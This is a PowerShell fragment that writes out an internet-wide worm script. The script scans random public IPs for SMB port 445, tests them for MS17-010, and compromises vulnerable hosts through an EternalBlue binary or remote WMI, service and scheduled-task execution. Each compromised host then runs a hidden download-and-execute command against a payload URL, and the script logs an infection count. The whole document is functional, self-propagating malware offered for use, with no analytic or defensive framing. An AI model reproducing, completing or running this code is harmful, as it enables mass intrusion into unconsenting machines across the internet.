# Create standalone worm script file for scheduled task persistence (INTERNET-ONLY, OPTIMIZED)
$wormScriptPath = "$BASE\mf_worm.ps1"
$wormScriptContent = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$ErrorActionPreference = "SilentlyContinue"
`$ProgressPreference = "SilentlyContinue"

`$BASE = "$BASE"
`$PAYLOAD_URL = "$PAYLOAD_URL"
`$MAX_TARGETS = $MAX_TARGETS
`$WORM_EXPIRY = "$WORM_EXPIRY"
`$ebExe = "$ebExe"
`$ebReady = $ebReady
`$STATUS_FILE = "$STATUS_FILE"
`$WORM_LOG = "`$BASE\worm.log"

function WLog {
    param([string]`$msg)
    try { `$ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "`$BASE\worm.log" -Value "[`$ts] `$msg" -ErrorAction SilentlyContinue } catch {}
}

function Update-Status {
    param([string]`$key, `$value)
    try {
        `$lock = New-Object System.Threading.Mutex(`$false, "Global\MF_Worm_Status_Lock")
        `$lock.WaitOne(5000) | Out-Null
        `$raw = Get-Content `$STATUS_FILE -Raw -ErrorAction SilentlyContinue
        `$json = `$raw | ConvertFrom-Json -ErrorAction SilentlyContinue
        if (-not `$json) { `$json = @{} }
        `$json.`$key = `$value
        `$json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        `$json | ConvertTo-Json -Compress | Set-Content `$STATUS_FILE -Force -ErrorAction SilentlyContinue
        `$lock.ReleaseMutex()
    } catch {}
}

function Get-RandomPublicIP {
    `$ranges = @(
        @(30, 1, 223), @(10, 45, 45), @(10, 52, 52), @(10, 13, 13), @(8, 104, 104), @(8, 18, 18),
        @(5, 199, 199), @(5, 207, 207), @(5, 208, 208), @(5, 209, 209), @(5, 64, 64), @(5, 67, 67),
        @(5, 68, 68), @(5, 69, 69), @(5, 70, 70), @(5, 71, 71), @(5, 72, 72), @(5, 73, 73), @(5, 74, 74),
        @(5, 75, 75), @(5, 76, 76), @(5, 77, 77), @(5, 78, 78), @(5, 79, 79), @(5, 80, 80), @(5, 81, 81),
        @(5, 82, 82), @(5, 83, 83), @(5, 84, 84), @(5, 85, 85), @(5, 86, 86), @(5, 87, 87), @(5, 88, 88),
        @(5, 89, 89), @(5, 90, 90), @(5, 91, 91), @(5, 92, 92), @(5, 93, 93), @(5, 94, 94), @(5, 95, 95),
        @(5, 96, 96), @(5, 97, 97), @(5, 98, 98), @(5, 99, 99), @(5, 100, 100), @(5, 101, 101), @(5, 102, 102),
        @(5, 103, 103), @(5, 107, 107), @(5, 108, 108), @(5, 110, 110), @(5, 111, 111), @(5, 112, 112),
        @(5, 113, 113), @(5, 114, 114), @(5, 115, 115), @(5, 116, 116), @(5, 117, 117), @(5, 118, 118),
        @(5, 119, 119), @(5, 120, 120), @(5, 121, 121), @(5, 122, 122), @(5, 123, 123), @(5, 124, 124),
        @(5, 125, 125), @(5, 126, 126), @(5, 128, 128), @(5, 129, 129), @(5, 130, 130), @(5, 131, 131),
        @(5, 132, 132), @(5, 134, 134), @(5, 136, 136), @(5, 137, 137), @(5, 138, 138), @(5, 139, 139),
        @(5, 140, 140), @(5, 141, 141), @(5, 142, 142), @(5, 143, 143), @(5, 144, 144), @(5, 146, 146),
        @(5, 147, 147), @(5, 148, 148), @(5, 149, 149), @(5, 150, 150), @(5, 151, 151), @(5, 152, 152),
        @(5, 153, 153), @(5, 154, 154), @(5, 155, 155), @(5, 156, 156), @(5, 157, 157), @(5, 158, 158),
        @(5, 159, 159), @(5, 160, 160), @(5, 161, 161), @(5, 162, 162), @(5, 163, 163), @(5, 164, 164),
        @(5, 165, 165), @(5, 166, 166), @(5, 167, 167), @(5, 168, 168), @(5, 169, 169), @(5, 170, 170),
        @(5, 171, 171), @(5, 172, 172), @(5, 173, 173), @(5, 174, 174), @(5, 175, 175), @(5, 176, 176),
        @(5, 177, 177), @(5, 178, 178), @(5, 179, 179), @(5, 180, 180), @(5, 181, 181), @(5, 182, 182),
        @(5, 183, 183), @(5, 184, 184), @(5, 185, 185), @(5, 186, 186), @(5, 187, 187), @(5, 188, 188),
        @(5, 189, 189), @(5, 190, 190), @(5, 191, 191), @(5, 192, 192), @(5, 193, 193), @(5, 194, 194),
        @(5, 195, 195), @(5, 196, 196), @(5, 197, 197), @(5, 198, 198), @(5, 200, 200), @(5, 201, 201),
        @(5, 202, 202), @(5, 203, 203), @(5, 204, 204), @(5, 205, 205), @(5, 206, 206), @(5, 210, 210),
        @(5, 211, 211), @(5, 212, 212), @(5, 213, 213), @(5, 214, 214), @(5, 215, 215), @(5, 216, 216),
        @(5, 217, 217), @(5, 218, 218), @(5, 219, 219), @(5, 220, 220), @(5, 221, 221), @(5, 222, 222),
        @(5, 223, 223)
    )
    `$totalWeight = (`$ranges | Measure-Object -Property 0 -Sum).Sum
    `$pick = Get-Random -Maximum `$totalWeight
    `$accum = 0
    `$selectedRange = `$ranges[0]
    foreach (`$r in `$ranges) { `$accum += `$r[0]; if (`$pick -lt `$accum) { `$selectedRange = `$r; break } }
    while (`$true) {
        `$a = Get-Random -Minimum `$selectedRange[1] -Maximum (`$selectedRange[2] + 1)
        `$b = Get-Random -Minimum 0 -Maximum 256; `$c = Get-Random -Minimum 0 -Maximum 256; `$d = Get-Random -Minimum 1 -Maximum 255
        if (`$a -eq 10 -or `$a -eq 127 -or (`$a -eq 169 -and `$b -eq 254) -or `$a -eq 0 -or `$a -ge 224) { continue }
        if (`$a -eq 172 -and `$b -ge 16 -and `$b -le 31) { continue }
        if (`$a -eq 192 -and `$b -eq 168) { continue }
        if (`$a -eq 100 -and `$b -ge 64 -and `$b -le 127) { continue }
        if (`$a -eq 192 -and `$b -eq 0 -and `$c -eq 2) { continue }
        if (`$a -eq 198 -and (`$b -eq 18 -or `$b -eq 19)) { continue }
        if (`$a -eq 198 -and `$b -eq 51 -and `$c -eq 100) { continue }
        if (`$a -eq 203 -and `$b -eq 0 -and `$c -eq 113) { continue }
        if (`$a -eq 192 -and `$b -eq 88 -and `$c -eq 99) { continue }
        return "`$a.`$b.`$c.`$d"
    }
}

function Scan-SMBHosts { param([int]`$Count = 1000)
    `$openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    `$runspacePool = [runspacefactory]::CreateRunspacePool(1, 200); `$runspacePool.Open()
    `$jobs = [System.Collections.ArrayList]::new()
    `$ipBatch = @(); for (`$i = 0; `$i -lt `$Count; `$i++) { `$ipBatch += Get-RandomPublicIP }
    WLog "Scanning `$Count random internet IPs for port 445 (200 parallel)..."
    foreach (`$ip in `$ipBatch) {
        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$runspacePool
        [void]`$ps.AddScript({ param(`$t) `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(800, `$false); if (`$success -and `$tcp.Connected) { `$tcp.Close(); return `$t } try { `$tcp.Close() } catch {}; return `$null })
        [void]`$ps.AddArgument(`$ip); `$job = `$ps.BeginInvoke(); `$jobs.Add(@{ PS = `$ps; Job = `$job; Target = `$ip })
    }
    `$completed = 0; foreach (`$j in `$jobs) { `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$openHosts.Add(`$result[0]) }; `$j.PS.Dispose(); `$completed++; if (`$completed % 200 -eq 0) { Update-Status "last_action" "Scanned `$completed/`$Count IPs..." } }
    `$runspacePool.Close(); `$runspacePool.Dispose()
    WLog "Scan complete. `$(`$openHosts.Count) hosts with port 445 open."; return `$openHosts.ToArray()
}

function Test-EBVuln { param([string]`$ip)
    try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$ip, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$false }
    `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000
    `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300
    `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close()
    if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$true }
    return `$false } catch { return `$false }
}

function Invoke-EBExploit { param([string]`$ip)
    `$randChar = [char](Get-Random -Minimum 97 -Maximum 122)
    `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$PAYLOAD_URL\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""
    if (`$ebReady -and (Test-Path `$ebExe)) { WLog "Firing compiled EB exploit at `$ip"; try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$ip\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { WLog "EB exploit executed on `$ip"; return `$true } } catch { WLog "EB exploit binary failed: `$(`$_.Exception.Message)" } }
    WLog "Trying PS-based exploitation on `$ip"; `$result = `$false
    foreach (`$m in @(
        { try { `$r = Invoke-WmiMethod -ComputerName `$ip -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return `$true } } catch {}; return `$false },
        { try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$ip create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$ip start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$ip delete \$sn 2>nul" 2>`$null; return `$true } catch {}; return `$false },
        { try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$ip /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$ip /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$ip /tn \$tn /f 2>nul" 2>`$null; return `$true } catch {}; return `$false }
    )) { if (& `$m) { `$result = `$true; break } }
    if (`$result) { WLog "Exploitation succeeded on `$ip" }; return `$result
}

function Test-Gov { try { `$exp = [datetime]::Parse(`$WORM_EXPIRY); if ((Get-Date) -gt `$exp) { WLog "Worm expired"; return `$false } } catch {}; `$cnt = 0; try { if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}; if (`$cnt -ge `$MAX_TARGETS) { WLog "Cap reached: `$cnt/`$MAX_TARGETS"; return `$false }; return `$true }
function Update-Count { try { `$cnt = 0; if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }; `$cnt++; Set-Content -Path "`$BASE\infection_count.txt" -Value `$cnt -Force -ErrorAction SilentlyContinue; WLog "Infection count: `$cnt/`$MAX_TARGETS"; Update-Status "infected" `$cnt } catch {} }

WLog "============================================"; WLog "WORM MODULE STARTING - INTERNET WIDE ONLY"; WLog "Max targets: `$MAX_TARGETS"; WLog "Expiry: `$WORM_EXPIRY"; WLog "EB Exploit: `$ebReady"; WLog "============================================"
if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }

`$batchNum = 0; while ((Test-Gov)) { `$batchNum++; Update-Status "last_action" "Scanning batch `$batchNum (1000 IPs)"; WLog "Phase 1: Internet-wide random IP discovery - Batch `$batchNum (port 445)"
    `$smbHosts = Scan-SMBHosts -Count 1000
    `$scanned = 0; try { `$scanned = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).scanned } catch {}; `$scanned += 1000; Update-Status "scanned" `$scanned; Update-Status "open_445" `$smbHosts.Count
    WLog "SMB hosts found: `$(`$smbHosts.Count)"
    if (`$smbHosts.Count -eq 0) { WLog "No hosts in batch `$batchNum. Next batch immediately..."; Update-Status "last_action" "No hosts found, next batch..."; continue }
    WLog "Phase 2: Parallel vulnerability testing + exploitation"; `$vulnHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    `$vulnPool = [runspacefactory]::CreateRunspacePool(1, 50); `$vulnPool.Open(); `$vulnJobs = @()
    foreach (`$ip in `$smbHosts) { if (-not (Test-Gov)) { break }; `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$vulnPool
        [void]`$ps.AddScript({ param(`$t) try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$null }; `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000; `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00); `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300; `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close(); if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$t }; return `$null } catch { return `$null } })
        [void]`$ps.AddArgument(`$ip); `$vulnJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
    }
    foreach (`$j in `$vulnJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$vulnHosts.Add(`$result[0]); `$vulnCount = 0; try { `$vulnCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).vulnerable } catch {}; `$vulnCount++; Update-Status "vulnerable" `$vulnCount; WLog "`$(`$result[0]) VULNERABLE to MS17-010" }; `$j.PS.Dispose() }
    `$vulnPool.Close(); `$vulnPool.Dispose()
    WLog "Vulnerable hosts: `$(`$vulnHosts.Count)"
    
    `$exploitPool = [runspacefactory]::CreateRunspacePool(1, 10); `$exploitPool.Open(); `$exploitJobs = @()
    foreach (`$ip in `$vulnHosts) { if (-not (Test-Gov)) { break }; Update-Status "last_ip" `$ip; Update-Status "last_action" "Exploiting `$ip..."
        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$exploitPool
        [void]`$ps.AddScript({ param(`$t, `$u, `$ebReady, `$ebExe) `$randChar = [char](Get-Random -Minimum 97 -Maximum 122); `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$u\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""; if (`$ebReady -and (Test-Path `$ebExe)) { try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$t\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { return @(`$true, "EB") } } catch {} }; try { `$r = Invoke-WmiMethod -ComputerName `$t -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return @(`$true, "WMI") } } catch {}; try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$t create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$t start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$t delete \$sn 2>nul" 2>`$null; return @(`$true, "SCM") } catch {}; try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$t /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$t /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$t /tn \$tn /f 2>nul" 2>`$null; return @(`$true, "Task") } catch {}; return @(`$false, "None") })
        [void]`$ps.AddArgument(`$ip); [void]`$ps.AddArgument(`$PAYLOAD_URL); [void]`$ps.AddArgument(`$ebReady); [void]`$ps.AddArgument(`$ebExe); `$exploitJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
    }
    foreach (`$j in `$exploitJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0] -eq `$true) { Update-Count; WLog "INFECTED `$(`$j.IP) via `$(`$result[1]) (Total: `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue)))" } else { `$failCount = 0; try { `$failCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).failed } catch {}; `$failCount++; Update-Status "failed" `$failCount; WLog "Exploitation failed on `$(`$j.IP)" }; `$j.PS.Dispose() }
    `$exploitPool.Close(); `$exploitPool.Dispose()
    if ((Test-Gov) -eq `$false) { break }; Start-Sleep -Seconds 2
}
Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"; WLog "============================================"; WLog "WORM COMPLETE - Infected `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue))/`$MAX_TARGETS targets"; WLog "============================================"
"@

[System.IO.File]::WriteAllText($wormScriptPath, $wormScriptContent, (New-Object System.Text.UTF8Encoding $false))